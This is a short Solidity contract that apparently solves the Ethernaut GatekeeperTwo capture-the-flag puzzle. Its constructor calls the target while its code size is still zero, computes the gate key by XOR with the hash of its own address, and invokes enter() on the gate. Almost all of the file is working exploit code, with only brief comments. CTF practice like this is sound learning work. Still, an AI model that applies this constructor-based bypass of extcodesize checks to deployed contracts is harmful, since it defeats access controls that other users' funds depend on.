pragma solidity ^0.4.18;

contract GatekeeperTwo {
  function enter(bytes8 _gateKey) public returns (bool);
}

contract GateSmasher {
    function GateSmasher(address _gate) public {
        // Do the work inside constructor so extcodesize === 0
        
        // Initialize GatekeeperTwo
        GatekeeperTwo gate = GatekeeperTwo(_gate);
        
        // Determine the key with XOR magic
        // A XOR B = C === A XOR C = B
        bytes8 key = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1));
        
        // Open the gate
        gate.call(bytes4(keccak256('enter(bytes8)')), key);
    }
}
